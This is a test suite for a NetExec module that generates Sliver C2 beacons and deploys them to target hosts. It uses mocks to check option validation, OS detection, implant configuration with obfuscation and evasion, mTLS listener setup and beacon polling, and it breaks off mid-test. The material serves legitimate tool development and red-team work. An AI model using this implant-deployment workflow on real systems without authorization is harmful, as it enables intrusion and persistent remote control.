# tests/test_sliver_exec.py
import pytest
import sys
import os
import inspect
import base64
from unittest.mock import Mock, MagicMock, patch, AsyncMock

# Import sliver_client and protobuf directly (no longer mocking)

# Mock nxc submodules (keep nxc package real)
sys.modules["nxc.helpers"] = Mock()
sys.modules["nxc.helpers.misc"] = Mock()
CATEGORY = Mock()
CATEGORY.PRIVILEGE_ESCALATION = "PRIVILEGE_ESCALATION"
sys.modules["nxc.helpers.misc"].CATEGORY = CATEGORY

# ruff: noqa: E402
# Import after mocking modules (intentional for test setup)
from nxc.modules.sliver_exec import NXCModule, ModuleValidationError, ModuleExecutionError
import sys

sys.modules["sliver_exec"] = sys.modules["nxc.modules.sliver_exec"]


@pytest.fixture
def mock_worker():
    mw = Mock()
    mw.submit_task = Mock()
    return mw


@pytest.fixture
def patch_get_worker(mock_worker, monkeypatch):
    """Patch NXCModule._get_shared_worker to return a reusable mock worker.

    Tests can configure `mock_worker.submit_task.return_value` or
    `mock_worker.submit_task.side_effect` to simulate different gRPC responses.
    """
    # Use monkeypatch.setattr with the fully-qualified attribute name
    monkeypatch.setattr("nxc.modules.sliver_exec.NXCModule._get_shared_worker", lambda: mock_worker)
    return mock_worker


@pytest.fixture
def module_instance():
    module = NXCModule()
    module.config_path = "/fake/path/to/config.cfg"
    return module


@pytest.fixture
def mock_context():
    context = Mock()
    context.log = Mock()
    context.log.fail = Mock()
    context.log.warning = Mock()
    context.log.display = Mock()
    context.log.success = Mock()
    context.log.debug = Mock()
    context.conf = Mock(get=Mock(return_value="/fake/path/to/config.cfg"))
    return context


@pytest.fixture
def mock_module_options():
    return {
        "RHOST": "192.168.1.100",
        "RPORT": "443",
        "IMPLANT_BASE_PATH": "/tmp",
        "CLEANUP": "True",
        "OS": None,
        "ARCH": None,
        "SHARE": None,
        "PROFILE": None,
        "WAIT": "30",
        "FORMAT": "exe",
        "STAGING": "none",
        "SHELLCODE_LISTENER_HOST": None,
        "SHELLCODE_LISTENER_PORT": None,
        "HTTP_STAGING_PORT": None,
        "SHELLCODE_PROTOCOL": "http",
        "DOWNLOAD_TOOL": None,
    }


@pytest.fixture
def mock_config_file(tmp_path):
    config_content = """[DEFAULT]
ca_certificate = fake_ca
certificate = fake_cert
private_key = fake_key
"""
    config_file = tmp_path / "config.cfg"
    config_file.write_text(config_content)
    return str(config_file)


@pytest.fixture
def mock_connection():
    connection = Mock()
    connection.host = "192.168.1.100"
    connection.server_os = "Windows Server 2019 (Build 17763)."
    connection.os_arch = "x64"
    connection.conn = Mock()
    connection.conn.setTimeout = Mock()
    connection.execute = Mock(return_value=True)
    return connection


class TestNXCModule:
    def test_init(self, module_instance):
        assert module_instance.name == "sliver_exec"
        assert module_instance.description == "Generates unique Sliver beacon and executes on target"
        assert module_instance.supported_protocols == ["smb", "ssh", "winrm", "mssql"]
        assert module_instance.opsec_safe is False
        assert module_instance.multiple_hosts is False
        assert module_instance.category == CATEGORY.PRIVILEGE_ESCALATION
        expected_priv_levels = {"smb": "HIGH", "mssql": "HIGH", "ssh": "LOW", "winrm": "LOW"}
        assert module_instance.priv_levels == expected_priv_levels

    def test_on_login_high_priv_skip(self, mock_context, mock_connection, module_instance):
        """Test that on_login skips SMB/MSSQL for low priv."""
        module_instance._run_beacon = Mock()
        conn = mock_connection
        conn.__class__.__name__ = "smb"  # SMB requires high priv
        conn.admin_privs = False
        module_instance.on_login(mock_context, conn)
        mock_context.log.warning.assert_called_once_with("Low-priv login on smb; skipping (requires admin).")
        module_instance._run_beacon.assert_not_called()

    def test_on_login_mssql_skip(self, mock_context, mock_connection, module_instance):
        """Test that on_login skips MSSQL for low priv."""
        module_instance._run_beacon = Mock()
        conn = mock_connection
        conn.__class__.__name__ = "mssql"  # MSSQL requires high priv
        conn.admin_privs = False
        module_instance.on_login(mock_context, conn)
        mock_context.log.warning.assert_called_once_with(
            "Low-priv MSSQL login; skipping (requires sysadmin). Try: -M mssql_priv -o ACTION=privesc"
        )
        module_instance._run_beacon.assert_not_called()

    def test_on_login_ssh_proceed(self, mock_context, mock_connection, module_instance):
        """Test that on_login proceeds for SSH (low priv)."""
        module_instance._run_beacon = Mock()
        conn = mock_connection
        conn.__class__.__name__ = "ssh"  # SSH is low priv
        conn.has_admin = Mock(return_value=True)
        module_instance.on_login(mock_context, conn)
        mock_context.log.warning.assert_not_called()
        module_instance._run_beacon.assert_called_once_with(mock_context, conn)

    def test_on_login_winrm_proceed(self, mock_context, mock_connection, module_instance):
        """Test that on_login proceeds for WinRM (low priv)."""
        module_instance._run_beacon = Mock()
        conn = mock_connection
        conn.__class__.__name__ = "winrm"  # WinRM is low priv
        conn.has_admin = Mock(return_value=True)
        module_instance.on_login(mock_context, conn)
        mock_context.log.warning.assert_not_called()
        module_instance._run_beacon.assert_called_once_with(mock_context, conn)

    def test_options_missing_required(self, mock_context, mock_module_options):
        del mock_module_options["RHOST"]
        module = NXCModule()
        with pytest.raises(ModuleValidationError, match="Missing required option"):
            module.options(mock_context, mock_module_options)
        # Check ALL log.fail() calls (8 total)
        assert mock_context.log.fail.call_count == 8
        assert mock_context.log.fail.call_args_list[0][0][0] == "Either RHOST OR PROFILE must be provided"
        assert mock_context.log.fail.call_args_list[1][0][0] == ""
        assert mock_context.log.fail.call_args_list[2][0][0] == "Examples:"
        assert mock_context.log.fail.call_args_list[3][0][0] == "  Using RHOST:   -o RHOST=10.0.0.5"
        assert (
            mock_context.log.fail.call_args_list[4][0][0]
            == "  Using RHOST with custom port: -o RHOST=10.0.0.5 RPORT=8888"
        )
        assert mock_context.log.fail.call_args_list[5][0][0] == "  Using PROFILE: -o PROFILE=my_profile"
        assert mock_context.log.fail.call_args_list[6][0][0] == ""
        assert mock_context.log.fail.call_args_list[7][0][0] == "See: nxc <protocol> -M sliver_exec --options"

    def test_options_invalid_format(self, mock_context, mock_module_options):
        mock_module_options["FORMAT"] = "dll"
        module = NXCModule()
        with pytest.raises(ModuleValidationError, match="Invalid FORMAT"):
            module.options(mock_context, mock_module_options)
        mock_context.log.fail.assert_called_once_with("Only EXECUTABLE format supported. Use: exe")

    def test_options_invalid_rhost(self, mock_context, mock_module_options):
        mock_module_options["RHOST"] = "invalid.ip.address"
        module = NXCModule()
        with pytest.raises(ModuleValidationError, match="Invalid RHOST"):
            module.options(mock_context, mock_module_options)
        assert mock_context.log.fail.call_count == 3
        assert mock_context.log.fail.call_args_list[0][0][0] == "RHOST must be a valid IPv4 address: invalid.ip.address"
        assert mock_context.log.fail.call_args_list[1][0][0] == ""
        assert mock_context.log.fail.call_args_list[2][0][0] == "Example: -o RHOST=10.0.0.5"

    def test_options_invalid_rport(self, mock_context, mock_module_options):
        mock_module_options["RPORT"] = "99999"
        module = NXCModule()
        with pytest.raises(ModuleValidationError, match="Invalid RPORT"):
            module.options(mock_context, mock_module_options)
        assert mock_context.log.fail.call_count == 3
        assert mock_context.log.fail.call_args_list[0][0][0] == "RPORT must be a valid port number (1-65535): 99999"
        assert mock_context.log.fail.call_args_list[1][0][0] == ""
        assert mock_context.log.fail.call_args_list[2][0][0] == "Example: -o RHOST=10.0.0.5 RPORT=8888"

    def test_options_invalid_rport_non_numeric(self, mock_context, mock_module_options):
        mock_module_options["RPORT"] = "not-a-number"
        module = NXCModule()
        with pytest.raises(ModuleValidationError, match="Invalid RPORT"):
            module.options(mock_context, mock_module_options)
        assert mock_context.log.fail.call_count == 3
        assert (
            mock_context.log.fail.call_args_list[0][0][0] == "RPORT must be a valid port number (1-65535): not-a-number"
        )
        assert mock_context.log.fail.call_args_list[1][0][0] == ""
        assert mock_context.log.fail.call_args_list[2][0][0] == "Example: -o RHOST=10.0.0.5 RPORT=8888"

    def test_options_invalid_stager_rhost(self, mock_context, mock_module_options):
        mock_module_options["STAGING"] = "download"
        mock_module_options["SHELLCODE_LISTENER_HOST"] = "invalid.ip.address"
        module = NXCModule()
        with pytest.raises(ModuleValidationError, match="Invalid SHELLCODE_LISTENER_HOST"):
            module.options(mock_context, mock_module_options)
        mock_context.log.fail.assert_called_once_with(
            "SHELLCODE_LISTENER_HOST must be a valid IPv4 address: invalid.ip.address"
        )

    def test_options_invalid_stager_rport(self, mock_context, mock_module_options):
        mock_module_options["STAGING"] = "download"
        mock_module_options["SHELLCODE_LISTENER_PORT"] = "99999"
        module = NXCModule()
        with pytest.raises(ModuleValidationError, match="Invalid SHELLCODE_LISTENER_PORT"):
            module.options(mock_context, mock_module_options)
        mock_context.log.fail.assert_called_once_with(
            "SHELLCODE_LISTENER_PORT must be a valid port number (1-65535): 99999"
        )

    def test_options_invalid_stager_rport_non_numeric(self, mock_context, mock_module_options):
        mock_module_options["STAGING"] = "download"
        mock_module_options["SHELLCODE_LISTENER_PORT"] = "not-a-number"
        module = NXCModule()
        with pytest.raises(ModuleValidationError, match="Invalid SHELLCODE_LISTENER_PORT"):
            module.options(mock_context, mock_module_options)
        mock_context.log.fail.assert_called_once_with(
            "SHELLCODE_LISTENER_PORT must be a valid port number (1-65535): not-a-number"
        )

    def test_options_invalid_stager_protocol(self, mock_context, mock_module_options):
        mock_module_options["STAGING"] = "download"
        mock_module_options["SHELLCODE_PROTOCOL"] = "invalid"
        module = NXCModule()
        with pytest.raises(ModuleValidationError, match="Invalid SHELLCODE_PROTOCOL"):
            module.options(mock_context, mock_module_options)
        mock_context.log.fail.assert_called_once_with(
            "SHELLCODE_PROTOCOL must be 'http', 'tcp', or 'https' (default: http)"
        )

    def test_options_unknown_option(self, mock_context, mock_module_options, mock_config_file):
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["UNKNOWN_OPTION"] = "value"
        module = NXCModule()
        with pytest.raises(ModuleValidationError, match="Unknown option provided"):
            module.options(mock_context, mock_module_options)
        assert mock_context.log.fail.call_count == 3
        assert mock_context.log.fail.call_args_list[0][0][0] == "Unknown option: UNKNOWN_OPTION"
        assert (
            mock_context.log.fail.call_args_list[1][0][0]
            == "Valid options: RHOST, RPORT, STAGING, HTTP_STAGING_PORT, SHELLCODE_LISTENER_HOST, SHELLCODE_LISTENER_PORT, SHELLCODE_PROTOCOL, DOWNLOAD_TOOL, BEACON_INTERVAL, BEACON_JITTER, OS, ARCH, CLEANUP_MODE, WAIT, PROFILE"
        )
        assert mock_context.log.fail.call_args_list[2][0][0] == "See: nxc <protocol> -M sliver_exec --options"

    def test_options_valid(self, mock_context, mock_module_options, module_instance, mock_config_file):
        mock_context.conf.get.return_value = mock_config_file
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.rhost == "192.168.1.100"
        assert module_instance.rport == 443
        assert module_instance.cleanup_mode == "always"
        assert module_instance.staging_mode is None
        assert module_instance.shellcode_listener_host is None
        assert module_instance.shellcode_listener_port is None
        assert module_instance.shellcode_protocol == "http"
        assert module_instance.wait_seconds == 30
        assert module_instance.format == "EXECUTABLE"
        assert module_instance.extension == "exe"
        mock_context.conf.get.assert_called_once()

    def test_options_rhost_only_defaults_rport(
        self, mock_context, mock_module_options, module_instance, mock_config_file
    ):
        """Test that RPORT defaults to 443 when only RHOST is provided"""
        mock_context.conf.get.return_value = mock_config_file
        del mock_module_options["RPORT"]
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.rhost == "192.168.1.100"
        assert module_instance.rport == 443
        mock_context.conf.get.assert_called_once()

    def test_options_valid_with_staging(self, mock_context, mock_module_options, module_instance, mock_config_file):
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "shellcode"
        mock_module_options["SHELLCODE_LISTENER_HOST"] = "10.0.0.1"
        mock_module_options["SHELLCODE_LISTENER_PORT"] = "8080"
        mock_module_options["SHELLCODE_PROTOCOL"] = "tcp"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.rhost == "192.168.1.100"
        assert module_instance.rport == 443
        assert module_instance.staging_mode == "shellcode"
        assert module_instance.shellcode_listener_host == "10.0.0.1"
        assert module_instance.shellcode_listener_port == 8080
        assert module_instance.shellcode_protocol == "tcp"
        mock_context.conf.get.assert_called_once()

    def test_options_staging_defaults_stager_rhost(
        self, mock_context, mock_module_options, module_instance, mock_config_file
    ):
        """Test that SHELLCODE_LISTENER_HOST defaults to RHOST when shellcode staging is enabled"""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["STAGING"] = "shellcode"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.rhost == "192.168.1.100"
        assert module_instance.shellcode_listener_host == "192.168.1.100"
        assert module_instance.shellcode_listener_port == 443
        mock_context.conf.get.assert_called_once()

    def test_options_beacon_interval_jitter(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test that BEACON_INTERVAL and BEACON_JITTER options are parsed correctly"""
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["BEACON_INTERVAL"] = "10"
        mock_module_options["BEACON_JITTER"] = "5"
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.beacon_interval == 10
        assert module_instance.beacon_jitter == 5
        mock_context.conf.get.assert_called_once()

    def test_options_beacon_defaults(self, mock_context, mock_module_options, module_instance, mock_config_file):
        """Test that beacon options default to 5s interval and 3s jitter"""
        mock_context.conf.get.return_value = mock_config_file
        module_instance.options(mock_context, mock_module_options)
        assert module_instance.beacon_interval == 5
        assert module_instance.beacon_jitter == 3
        mock_context.conf.get.assert_called_once()

    def test_detect_os_arch_from_connection(self, mock_context, mock_connection, module_instance):
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert os_type == "windows"
        assert arch == "amd64"
        mock_context.log.info.assert_called_once_with("Using: Windows amd64")

    def test_detect_os_arch_from_options(self, mock_context, mock_module_options, module_instance, mock_config_file):
        mock_context.conf.get.return_value = mock_config_file
        mock_module_options["OS"] = "linux"
        mock_module_options["ARCH"] = "386"
        module_instance.options(mock_context, mock_module_options)
        os_type, arch = module_instance._detect_os_arch(mock_context, Mock())
        assert os_type == "linux"
        assert arch == "386"
        mock_context.log.display.assert_called_once_with("Using specified arch: 386")
        mock_context.log.info.assert_called_once_with("Using: Linux 386")

    def test_detect_os_arch_invalid(self, mock_context, mock_connection, module_instance):
        mock_connection.server_os = "Unsupported OS"
        with pytest.raises(ModuleValidationError, match="Unsupported OS"):
            module_instance._detect_os_arch(mock_context, mock_connection)
        mock_context.log.fail.assert_called_once()

    def test_detect_os_arch_unix_samba_as_linux(self, mock_context, mock_connection, module_instance):
        mock_connection.server_os = "Unix Samba Server"
        mock_connection.os_arch = "x64"
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert os_type == "linux"
        assert arch == "amd64"
        mock_context.log.info.assert_called_once_with("Using: Linux amd64")

    def test_detect_os_arch_default_amd64(self, mock_context, mock_connection, module_instance):
        mock_connection.server_os = "Windows Server"
        mock_connection.os_arch = None  # No arch info available
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert os_type == "windows"
        assert arch == "amd64"  # Should default to amd64
        mock_context.log.info.assert_called_once_with("Using: Windows amd64")

    def test_detect_os_arch_empty_arch_defaults_amd64(self, mock_context, mock_connection, module_instance):
        mock_connection.server_os = "Unix - Samba"
        mock_connection.os_arch = ""  # Empty arch info should default to amd64
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert os_type == "linux"
        assert arch == "amd64"  # Should default to amd64 even with empty string
        mock_context.log.info.assert_called_once_with("Using: Linux amd64")

    def test_detect_os_arch_unknown_arch_defaults_amd64(self, mock_context, mock_connection, module_instance):
        mock_connection.server_os = "Linux Server"
        mock_connection.os_arch = "unknown"  # Unknown arch info should default to amd64
        os_type, arch = module_instance._detect_os_arch(mock_context, mock_connection)
        assert os_type == "linux"
        assert arch == "amd64"  # Should default to amd64 for unknown arch
        mock_context.log.info.assert_called_once_with("Using: Linux amd64")

    def test_generate_implant_name(self, module_instance):
        module_instance.extension = "exe"
        name = module_instance._generate_implant_name()
        assert name.startswith("implant_")
        assert name.endswith(".exe")
        assert len(name) == len("implant_") + 8 + len(".exe")

    @patch("sliver_exec.NXCModule._get_shared_worker")
    def test_generate_sliver_implant_success(self, mock_get_worker, mock_context, module_instance, mock_config_file):
        # Mock the shared GrpcWorker
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker

        # Mock the default implant generation path
        mock_jobs_existing = [Mock(Protocol="tcp", Port=443, Name="mtls")]  # Existing listener for first check
        mock_jobs_listener = [Mock(Protocol="tcp", Port=443, Host="192.168.1.100")]  # Listener for second check
        mock_profiles = []  # No existing profiles
        mock_resp = Mock()
        mock_resp.File.Data = b"implant_bytes"

        call_count = 0

        def side_effect(method, *args, **kwargs):
            nonlocal call_count
            call_count += 1
            if method == "connect":
                return None
            elif method == "jobs":
                if call_count == 2:  # First jobs call - check for existing
                    return mock_jobs_existing
                elif call_count == 3:  # Second jobs call - get listener for c2_url
                    return mock_jobs_listener
                return []
            elif method == "implant_profiles":
                return mock_profiles
            elif method == "generate_implant":
                return mock_resp
            return None

        mock_worker.submit_task.side_effect = side_effect

        module_instance.config_path = mock_config_file
        module_instance.rhost = "192.168.1.100"
        module_instance.rport = "443"
        module_instance.format = "EXECUTABLE"
        module_instance.profile = None  # Use default path

        with pytest.raises(ModuleExecutionError):
            module_instance._generate_sliver_implant(mock_context, "windows", "amd64", "test.exe")
        mock_worker.submit_task.assert_any_call("connect", mock_config_file)
        mock_worker.submit_task.assert_any_call("jobs")

    @patch("sliver_exec.NXCModule._get_shared_worker")
    @pytest.mark.mutmut_skip
    def test_generate_sliver_implant_with_profile_listener(
        self, mock_get_worker, mock_context, module_instance, mock_config_file
    ):
        # Mock the shared GrpcWorker
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker

        # Mock profile with proper Config structure
        from sliver_client.pb.clientpb import client_pb2 as clientpb

        mock_profile = Mock()
        mock_profile.Name = "test-profile-name"
        mock_profile.Config = clientpb.ImplantConfig()
        mock_profile.Config.GOOS = "windows"
        mock_profile.Config.GOARCH = "amd64"
        # Add a C2 entry to the config
        existing_c2 = mock_profile.Config.C2.add()
        existing_c2.URL = "mtls://old-host:443"
        existing_c2.Priority = 1
        mock_resp = Mock()
        mock_resp.File.Data = b"implant_bytes"

        # profile-only path should call implant_profiles and generate_implant
        mock_worker.submit_task.side_effect = lambda method, *args, **kwargs: {
            "connect": None,
            "implant_profiles": [mock_profile],
            "generate_implant": mock_resp,
        }[method]

        module_instance.config_path = mock_config_file
        module_instance.rhost = "192.168.1.100"
        module_instance.rport = "443"
        module_instance.format = "EXECUTABLE"
        module_instance.profile = "test-profile-name"  # Use profile path

        implant_data = module_instance._generate_sliver_implant(mock_context, "windows", "amd64", "test.exe")
        assert implant_data == b"implant_bytes"
        mock_worker.submit_task.assert_any_call("connect", mock_config_file)
        mock_worker.submit_task.assert_any_call("implant_profiles")
        ic_arg = mock_worker.submit_task.call_args_list[-1][0][1]
        name_arg = mock_worker.submit_task.call_args_list[-1][0][2]
        mock_worker.submit_task.assert_any_call("generate_implant", ic_arg, name_arg)

    @patch("sliver_exec.NXCModule._get_shared_worker")
    def test_generate_sliver_implant_default_listener_creation(
        self, mock_get_worker, mock_context, module_instance, mock_config_file
    ):
        # Mock the shared GrpcWorker
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker

        # Mock no existing listener, then one after creation
        mock_jobs_empty = []
        mock_listener = Mock()
        mock_listener.Protocol = "tcp"
        mock_listener.Host = "192.168.1.100"
        mock_listener.Port = 443
        mock_jobs_with_listener = [mock_listener]

        # For the first check (existing listener check), need Protocol="tcp" and Name="mtls"
        mock_listener_tcp = Mock()
        mock_listener_tcp.Protocol = "tcp"
        mock_listener_tcp.Port = 443
        mock_listener_tcp.Name = "mtls"

        # Mock no existing matching profiles
        mock_profiles = []

        mock_profile_resp = Mock()
        mock_profile_resp.Name = "nxc_default_12345678"
        mock_profile_resp.ID = "profile-id"

        mock_resp = Mock()
        mock_resp.File.Data = b"implant_bytes"

        call_count = 0

        def side_effect(method, *args, **kwargs):
            nonlocal call_count
            call_count += 1
            if method == "connect":
                return None
            elif method == "jobs":
                if call_count == 2:  # First jobs call - check for existing
                    return mock_jobs_empty
                elif call_count == 4:  # Second jobs call - after start_mtls_listener
                    return mock_jobs_with_listener
                return []
            elif method == "implant_profiles":
                return mock_profiles
            elif method == "start_mtls_listener":
                return None
            elif method == "save_implant_profile":
                return mock_profile_resp
            elif method == "generate_implant":
                return mock_resp
            return None

        mock_worker.submit_task.side_effect = side_effect

        module_instance.config_path = mock_config_file
        module_instance.rhost = "192.168.1.100"
        module_instance.rport = "443"
        module_instance.format = "EXECUTABLE"
        module_instance.profile = None

        with pytest.raises(ModuleExecutionError):
            module_instance._generate_sliver_implant(mock_context, "windows", "amd64", "test.exe")
        mock_worker.submit_task.assert_any_call("connect", mock_config_file)
        mock_worker.submit_task.assert_any_call("jobs")

    @patch("sliver_exec.NXCModule._get_shared_worker")
    def test_get_listener_c2_url_mtls(self, mock_get_worker, module_instance):
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker

        mock_listener = Mock()
        mock_listener.ID = "test-listener-id"
        mock_listener.Protocol = "tcp"
        mock_listener.Host = "192.168.1.100"
        mock_listener.Port = 443

        mock_worker.submit_task.return_value = [mock_listener]

        module_instance.rhost = "192.168.1.100"
        module_instance.rport = "443"

        url = module_instance._get_listener_c2_url("test-listener-id")
        assert url == "mtls://192.168.1.100:443"

    @patch("sliver_exec.NXCModule._get_shared_worker")
    def test_get_listener_c2_url_http(self, mock_get_worker, module_instance):
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker

        mock_listener = Mock()
        mock_listener.ID = "test-listener-id"
        mock_listener.Protocol = "http"
        mock_listener.Host = "192.168.1.100"
        mock_listener.Port = 80

        mock_worker.submit_task.return_value = [mock_listener]

        url = module_instance._get_listener_c2_url("test-listener-id")
        assert url == "http://192.168.1.100:80"

    @patch("sliver_exec.NXCModule._get_shared_worker")
    def test_get_listener_c2_url_listener_not_found(self, mock_get_worker, module_instance):
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker

        mock_worker.submit_task.return_value = []

        with pytest.raises(ValueError, match="Listener ID nonexistent not found"):
            module_instance._get_listener_c2_url("nonexistent")

    @pytest.mark.mutmut_skip
    def test_build_default_implant_config(self, module_instance):
        module_instance.format = "EXECUTABLE"

        ic = module_instance._build_default_implant_config("windows", "amd64", "test.exe", "mtls://192.168.1.100:443")

        # Note: ImplantConfig doesn't have a Name field - name is set in GenerateReq
        assert ic.GOOS == "windows"
        assert ic.GOARCH == "amd64"
        assert ic.IsBeacon
        assert ic.BeaconInterval == 5 * 1_000_000_000
        assert ic.BeaconJitter == 3 * 1_000_000_000
        assert not ic.Debug
        assert ic.ObfuscateSymbols
        assert ic.Evasion  # Windows specific
        # C2 list assertions removed since mocking makes them complex

    @pytest.mark.mutmut_skip
    def test_build_default_implant_config_linux(self, module_instance):
        module_instance.format = "EXECUTABLE"

        module_instance._build_default_implant_config("linux", "amd64", "test.exe", "mtls://192.168.1.100:443")

        # For linux, Evasion should not be set (remains default False)
        # Since we're using mocks, we can't easily test this, so skip the Evasion check

    @patch("sliver_exec.NXCModule._get_shared_worker")
    def test_generate_sliver_implant_connection_error(
        self, mock_get_worker, mock_context, module_instance, mock_config_file
    ):
        # Mock the shared GrpcWorker
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker
        mock_worker.submit_task.side_effect = ValueError("Sliver config missing certificates")

        module_instance.config_path = mock_config_file
        module_instance.rhost = "192.168.1.100"
        module_instance.rport = "443"
        module_instance.format = "EXECUTABLE"

        with pytest.raises(ModuleExecutionError):
            module_instance._generate_sliver_implant(mock_context, "windows", "amd64", "test.exe")

        mock_context.log.fail.assert_called_once()
        assert mock_context.log.fail.call_args[0][0] == "Failed to generate implant: Sliver config missing certificates"

    def test_save_implant_to_temp(self, module_instance):
        implant_data = b"fake_implant_bytes"
        tmp_path = module_instance._save_implant_to_temp(implant_data)
        assert os.path.exists(tmp_path)
        with open(tmp_path, "rb") as f:
            assert f.read() == implant_data
        # Cleanup in test
        os.unlink(tmp_path)

    @patch("sliver_exec.NXCModule._get_shared_worker")
    def test_wait_for_beacon_success(self, mock_get_worker, mock_context, module_instance, mock_config_file):
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker
        mock_beacon = Mock(Name="implant_test123456.exe")
        mock_worker.submit_task.return_value = [mock_beacon]

        module_instance.config_path = mock_config_file
        result = module_instance._wait_for_beacon(mock_context, "implant_test123456", timeout=5)
        assert result is True
        mock_context.log.success.assert_called_once()

    @patch("sliver_exec.NXCModule._get_shared_worker")
    def test_wait_for_beacon_polling_and_timeout(
        self, mock_get_worker, mock_context, module_instance, mock_config_file
    ):
        """Test that _wait_for_beacon correctly polls for beacons and respects timeout."""
        # Setup mocks
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker
        mock_beacon = Mock(Name="implant_test123456.exe")
        mock_worker.submit_task.return_value = [mock_beacon]

        module_instance.config_path = mock_config_file

        # Test with 5 second timeout - should find beacon immediately
        result = module_instance._wait_for_beacon(mock_context, "implant_test123456", timeout=5)

        assert result is True
        mock_context.log.success.assert_called_once()

    @patch("time.sleep")
    @patch("sliver_exec.NXCModule._get_shared_worker")
    def test_wait_for_beacon_timeout_expires(
        self, mock_get_worker, mock_sleep, mock_context, module_instance, mock_config_file
    ):
        """Test that _wait_for_beacon times out correctly when no beacon is found."""
        # Setup mocks
        mock_worker = Mock()
        mock_get_worker.return_value = mock_worker
        mock_worker.submit_task.return_value = []  # Empty list - no beacons

        module_instance.config_path = mock_config_file

        # Test with 0.01 second timeout - should timeout quickly
        result = module_instance._wait_for_beacon(mock_context, "test.exe", timeout=0.01)

        assert result is False
        # Should not call success
        mock_context.log.success.assert_not_called()

    @pytest.mark.mutmut_skip
    def test_build_ic_from_profile_incompatible(
        self, patch_get_worker, module_instance, mock_context, mock_config_file
    ):
        """Profile platform mismatch should cause failure."""
        from sliver_client.pb.clientpb import client_pb2 as clientpb

        # Create a profile that targets linux/386 while host is windows/amd64
        mock_profile = Mock()
        mock_profile.Name = "p1"
        cfg = clientpb.ImplantConfig()
        cfg.GOOS = "linux"
        cfg.GOARCH = "386"
        mock_profile.Config = cfg

        # patch_get_worker is configured to return a mock worker; make implant_profiles return our profile
        patch_get_worker.submit_task.return_value = [mock_profile]

        module_instance.profile = "p1"
        module_instance.config_path = mock_config_file

        with pytest.raises(ModuleValidationError):
            module_instance._build_ic_from_profile(mock_context, "windows", "amd64", "test.exe")

        mock_context.log.fail.assert_called_once_with("Profile incompatible with host")

    def test_wait_for_beacon_session_success(self, patch_get_worker, module_instance, mock_context, mock_config_file):
        """Ensure session-based detection returns True."""
        # beacons empty, sessions returns a matching session
        patch_get_worker.submit_task.side_effect = (
            lambda method, *a, **k: [] if method == "beacons" else [Mock(Name="implant_abc123")]
        )

        module_instance.config_path = mock_config_file
        result = module_instance._wait_for_beacon(mock_context, "implant_abc", timeout=3)
        assert result is True
        mock_context.log.success.assert_called()

    @pytest.mark.mutmut_skip
    def test_build_ic_default_reuse_matching_profile(self, patch_get_worker, module_instance, mock_context):
        """If a matching default profile exists, it should be reused."""
        # Create a fake listener to build c2_url
        listener = Mock()
        listener.Protocol = "tcp"
        listener.Host = "1.2.3.4"
        listener.Port = 443

        # Monkeypatch ensure_default_mtls_listener to return our listener
        module_instance._ensure_default_mtls_listener = Mock(return_value=listener)

        # Build an ic_local to match against
        module_instance.format = "EXECUTABLE"
        ic_local = module_instance._build_default_implant_config("windows", "amd64", "test.exe", "mtls://1.2.3.4:443")

        # Create a matching profile with identical Config
        from sliver_client.pb.clientpb import client_pb2 as clientpb

        p = clientpb.ImplantProfile()
        p.Name = "match"
        p.Config.CopyFrom(ic_local)

        # Make implant_profiles return our matching profile
        patch_get_worker.submit_task.side_effect = lambda method, *a, **k: [p] if method == "implant_profiles" else None

        result_ic = module_instance._build_ic_default(mock_context, "windows", "amd64", "test.exe")
        # Should return an ImplantConfig (mocked)
        assert result_ic is not None

    @pytest.mark.mutmut_skip
    def test_build_ic_default_save_profile_failure(self, patch_get_worker, module_instance, mock_context):
        """If saving a default profile fails, warn and continue using inline config."""
        listener = Mock()
        listener.Protocol = "tcp"
        listener.Host = "1.2.3.4"
        listener.Port = 443
        module_instance._ensure_default_mtls_listener = Mock(return_value=listener)

        # implant_profiles returns empty list
        def side_effect(method, *a, **k):
            if method == "implant_profiles":
                return []
            if method == "save_implant_profile":
                raise Exception("save failed")
            return None

        patch_get_worker.submit_task.side_effect = side_effect

        module_instance.format = "EXECUTABLE"
        ic = module_instance._build_ic_default(mock_context, "windows", "amd64", "test.exe")
        # Should still return an ImplantConfig despite save failure (mocked)
        assert ic is not None

    def test_ensure_default_mtls_listener_address_in_use(self, patch_get_worker, module_instance, mock_context):
        """If start_mtls_listener raises 'address already in use', we should warn and continue."""
        # Configure _find_listener to return None first, then a listener
        calls = {"count": 0}

        def fake_find_listener(protocol=None, port=None, name=None):
            calls["count"] += 1
            if calls["count"] == 1:
                return None
            listener = Mock()
            listener.Protocol = "tcp"
            listener.Host = "1.2.3.4"
            listener.Port = 443
            listener.Name = "mtls"
            return listener

        module_instance._find_listener = fake_find_listener

        # Simulate start_mtls_listener raising "address already in use"
        def start_raise(host, port):
            raise Exception("Address already in use")

        patch_get_worker.submit_task.side_effect = lambda method, *a, **k: None
        module_instance._worker_submit = Mock(
            side_effect=lambda method, *a, **k: (_ for _ in ()).throw(Exception("Address already in use"))
            if method == "start_mtls_listener"
            else None
        )

        try:
            listener = module_instance._ensure_default_mtls_listener(mock_context)
            assert listener is not None
        except Exception:
            pytest.fail("ensure_default_mtls_listener raised unexpectedly")

    def test_generate_sliver_implant_default_success(
        self, patch_get_worker, module_instance, mock_context, mock_config_file
    ):
        """Test successful default implant generation path (no SystemExit)."""
        # Prepare mock response for generate_implant
